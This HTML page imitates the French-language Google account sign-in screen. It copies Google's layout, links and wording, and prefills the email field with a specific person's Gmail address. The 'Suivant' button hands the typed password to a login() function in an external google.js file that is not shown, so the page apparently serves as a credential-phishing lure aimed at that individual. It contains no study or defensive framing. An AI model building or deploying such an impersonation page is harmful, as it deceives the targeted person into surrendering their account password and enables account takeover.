<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
 
  <style> 
   #logo{
    width:12vh;
    height:auto;
    margin:0.5vh 0 0 0.5vh;
  
   }
   
   body {
    height:100vh;
    display : flex; flex-direction:column;
    align-items: flex-start;
    
    background-color: Canvas;
    color: CanvasText;
   }
   
   .body-elements{
   border:1px solid none;
    height:100%; width:91vw;
    display:flex; flex-direction:column;
    justify-content: flex-start;
    align-items:flex-start;
    margin-left:3.5vh;
    
   }
   
   .profile-div {
    border:1px solid rgb(0,0,0,0.7); border-radius:50px;
    display : flex;
    justify-content: space-between;;
    align-items: center;
    padding:0.1rem 0.8rem 0.1rem 0.0rem
   }
   #profile{
    border:none;
    height:35px; width:auto;
    border-radius :50%;
   }
   .select{
    border:none;
    background-color:canvas;
    font-weight: 500;
    width:52vw;
   }:focus{outline:none;}
   select{
    border:0;
    background-color:canvas;
    font-weight: 500;
    width:52vw;
   }:focus{outline:none;}
   
   .input-ckeckbox{
   border:1px solid none;
     margin-top:14.9vw;
     display :flex;
     flex-wrap:wrap;
     gap:5px 7px;
     width:100%;
     height:30vw;
        
   }
   #pwd{
    width:100%;
    padding : 7% 4%;
    border:2px solid rgb(0,0,0,0.9)
    border-radius:10px;
    font-size:1rem;
   
   }:focus{
   border-radius:5px;
   outline:1px rgba(135, 206, 250)
   }
   
   #label{
    display:flex;
    justify-content: space-between ;
    height:max-content; width:109%;
    margin-top:0.3125rem;
    border:1px solid none;
    
   }
  h4{
    margin:0;
    font-family: Arial;
    font-weight:500;
  }
   h5{
    margin :0;
    font-family: Arial;
   }
   h2{
    margin:0 0 0.9375rem 0;
    font-weight:510; font-size:1.9rem; 
 
   }
   
   .forgot-next{
   border:1px solid none;
   width:91%;
   height: max-content;
   display:flex;
   justify-content: space-between;
   align-items:center;
   margin:14.8vw 0 0 0;
   font-size:13px;
   color:deepskyblue;
   }

   button{
    background-color : DodgerBlue;
    border: 1px solid lightskyblue;
    padding:11px 25px 11px 25px;
    border-radius:50px;
    opacity:1;
    
   }
   
   .bottomline{
   border:1px solid none;
    display:flex;
    gap:40px;
    flex-wrap:wrap;
    height: max-content; width: 91vw;
    font-size:12px;
    margin-top:22vh;
    
   }
   .last-els{
   border:1px solid none;
    display: flex;
    gap:20px;
    color:black;
        
   }
   
   #forgot-a{
    text-decoration:none;
    color:DodgerBlue;
   }
   #bottom-a{
    text-decoration:none;
    color:CanvasText;
   }
   
   
   
   .e-field {
      position: relative;
      width: 85%;
   }

   .e-field input {
      width:52vw;
      padding: 9px 12px;
      border-radius: 6px;
      outline: none;
      background: transparent;
   }

   .e-field label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: white;
      padding: 0 6px;
      color: rgba(0,0,0,0.6);
      pointer-events: none;
      transition: 0.2s ease;
   }

   .e-field input:focus {
      border-color: #1E90FF;
   }

   .e-field input:focus + label,
   .e-field input:not(:placeholder-shown) + label {
      top: 0;
      transform: translateY(-80%);
      font-size: 10px;
      color: #1E90FF;
   }
   
   
   
   
   
   .field {
      position: relative;
      width: 85%;
      margin: 20px 0;
   }

   .field input {
      width: 100%;
      padding: 14px 12px;
      font-size: 16px;
      border: 1px solid rgba(0,0,0,0.7); 
      border-radius: 6px;
      outline: none;
      background: transparent;
   }

   .field label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      background: white;
      padding: 0 6px;
      color: rgba(0,0,0,0.6);
      font-size: 16px;
      pointer-events: none;
      transition: 0.2s ease;
   }

   .field input:focus {
      border-color: #1E90FF;
   }

   .field input:focus + label,
   .field input:not(:placeholder-shown) + label {
      top: 0;
      transform: translateY(-50%);
      font-size: 12px;
      color: #1E90FF;
   }
   
  </style>
    <img id="logo" src="logo.png"></img>
</head>

 <body>
    <div class="body-elements">
        <h2>Bienvenue</h2>
        
        <div class="profile-div">
            <img id="profile" src="icon-white-plain.png"></img>
            <h5>
                <div class="e-field">
                <input id="usrn" name="username" type="email" class="select" value="adambombole@gmail.com" placeholder=" ">
                <label for="usrn">
                    Adresse e-mail
                </label>
                </div>
             </h5>
        </div>
            
        <div class="input-ckeckbox">
            <div class="field">

                <input id="pwd" name="password" type="password" placeholder=" ">
                <label for="pwd">Saisissez votre mot de passe
                </label>
            </div>
            <label>
                <div id="label">
                    <input id="chckbx" type="checkbox" name="show-pwd">
                
                    <h4>Afficher le mot de passe</h4>
                </div>
            </label>
            
            <div class="forgot-next">
                <a href="https://accounts.google.com" id="forgot-a">Mot de passe oublié ?</a>
                
                <button onclick="login()">Suivant</button>
            </div>
            <div class="bottomline">
            <select style="width:45%;">
                <option>
                    Français(France)
                </option>
                <option>
                    Anglais(USA)
                </option>
                <option>
                    Anglais(UK)
                </option>
            </select>
            <div class="last-els">
                <a href="https://support.google.com/accounts?hl=fr&p=account_iph" id="bottom-a">Aide</a>
                <a href="https://accounts.google.com/TOS?loc=CD&hl=fr&privacy=true" id="bottom-a">Confidentialité</a>
                <a href="https://accounts.google.com/TOS?loc=CD&hl=fr" id="bottom-a">Conditions</a>
            </div>
            </div>
        </div>           
     
    </div>
    
    
       <script>
        const pwd = document.getElementById("pwd");
        const toggle = document.getElementById("chckbx");

        toggle.addEventListener("change", () => {
        pwd.type = toggle.checked ? "text" : "password";
        toggle.style.backgroundColor = toggle.checked ? "DodgerBlue" : "transparent"
  });
            const myselect = document.getElementById("usrn");
            
            function createInput(e){               
                myselect.value = "";
            }
            myselect.addEventListener("click", createInput);
        
        </script>
    <script src="google.js"></script>
 </body>
</html>
